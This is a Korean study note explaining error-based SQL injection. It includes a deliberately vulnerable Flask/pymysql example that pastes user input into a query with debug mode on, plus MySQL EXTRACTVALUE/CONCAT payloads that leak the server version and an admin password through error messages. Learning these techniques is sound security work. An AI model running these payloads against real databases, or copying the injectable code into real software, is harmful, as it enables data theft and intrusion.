# Error & Time based SQL Injection

* 쿼리 결과를 애플리케이션의 기능에서 출력하지 않는 경우에 사용할 수 있는 SQL Injection 공격 형태
    - **공격 성공 여부를 어떻게 판단하느냐**에 따라 명칭이 구분됨

<br/>

## Error based SQL Injection
임의로 에러를 발생시켜 데이터베이스 및 운영체제의 정보를 획득하는 공격 기법
* 애플리케이션에서 발생하는 에러를 이용해 공격하려고 한다면 **런타임 에러**(Runtime Error, *쿼리가 실행되고 나서 발생하는 에러*)가 필요함
    - 문법 에러(Syntax Error)와 같이 DBMS에서 쿼리가 실행되기 전에 발생하는 에러는 불가능함
* 공격자는 오류(에러) 메시지를 통해 공격에 필요한 다양한 정보를 수집하고 원하는 데이터를 획득할 수 있음
    - 에러 메시지와 같이 쿼리 실행 결과를 직접 노출하지는 않지만, **중요한 정보를 노출하는 방법들이 존재함**

<br/>

### Error based SQL Injection 예시
```python
from flask import Flask, request # Flask 프레임워크 사용
import pymysql

app = Flask(__name__)

def getConnection():
	return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')

@app.route('/', methods=['GET'])
def index():
	username = request.args.get('username') # 이용자가 전달한 username 인자값을 가져옴
	sql = "SELECT username FROM users WHERE username='%s'" %username # 이용자의 입력값 username이 별다른 검사 없이 SQL 쿼리에 포함 → SQL Injection 취약점이 발생함

	conn = getConnetion()
	curs = conn.cursor(pymysql.cursors.DictCursor)
	curs.execute(sql)
	rows = curs.fetchall()
	conn.close()

    # SQL 실행 결과를 출력하는 코드가 존재하지 않고 쿼리 실행 결과만을 판단함
	if (rows):
		return "True"
	else:
		return "False"

app.run(host='0.0.0.0', port=8000, debug=True) # 디버그 모드 활성화(debug=True)
```
* Error based SQL Injection 공격 방법
    - Flask 프레임워크로 개발된 애플리케이션에서 디버그 모드를 활성화하면 코드에서 오류가 발생했을 때 발생 원인을 출력함
        + username에 ```admin 1'``` 쿼리를 삽입했을 경우
            ```sql
            # 생성되는 쿼리 → 실행 결과 문법 에러(Syntax Error) 발생
            SELECT username FROM users WHERE username='admin 1''
            ```
	    	![extractvalue_error](https://github.com/augustf86/Today_I_Learn/assets/122844932/1456e630-17c8-4ef3-8210-9243933f7493)

* Error based SQL Injection 공격 코드
    - ```EXTRACTVALUE``` 함수: 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출하는 함수
        + 두 번째 인자로 올바른 XPATH 식을 전달한 경우 쿼리가 정상적으로 실행됨
            ```sql
            SELECT EXTRACTVALUE('<a>test</a><b>abcd</b>', '/a'); # 결과: test
            ```
        + 두 번째 인자로 올바르지 않은 XPATH 식을 전달한 경우 에러 메시지에 삽입된 식의 결과가 출력됨
            ```sql
            SELECT EXTRACTVALUE(1, ":abcd");
            # 결과: ERROR 1105 (HY000): XPATH syntax error: ':abcd'
            ```
            - 올바르지 않은 XPATH 식에 중요한 정보를 추출할 수 있는 식을 입력한다면 공격자는 중요 정보를 획득할 수 있음
    - MySQL 환경에서 Error based SQL Injection으로 공격할 때 많이 사용하는 쿼리와 실행 결과
        ```sql
        SELECT EXTRACTVALUE(1, CONCAT(0x3a, version()));
        # 결과: ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
        ```
        + XPATH식에 삽입된 ```version``` 함수가 실행되면서 에러 메시지에 운영 체제에 대한 정보(```'0ubuntu0.16.04.1'```)가 포함되어 있음 → 공격자는 이 정보를 이용해 1-day 또는 0-day 공격을 통해 서버를 장악할 수 있음
        + ```CONCAT``` 함수: 둘 이상의 문자열을 입력한 순서대로 합쳐서 반환해주는 함수
            - 사용 형식: ```CONCAT(문자열1, 문자열2[, 문자열3, ...])```
    - ```EXTRACTVALUE``` 함수를 응용하여 데이터베이스의 정보를 추출하는 쿼리와 실행 결과
        ```sql
        SELECT EXTRACTVALUE(1, CONCAT(0x3a, (SELECT password FROM users WHERE username='admin')))
        # 결과: ERROR 1105 (HY000): XPATH syntax error: ':This_is_admin_PASSW@rd'
        ```
        + XPATH식에 삽입된 서브 쿼리가 실행되면서 에러 메시지에 users 테이블의 admin 사용자의 비밀번호가 포함되어 있음 → 공격자는 서브 쿼리를 사용해 임의 테이블의 데이터를 획득할 수 있음

<br/><br/>
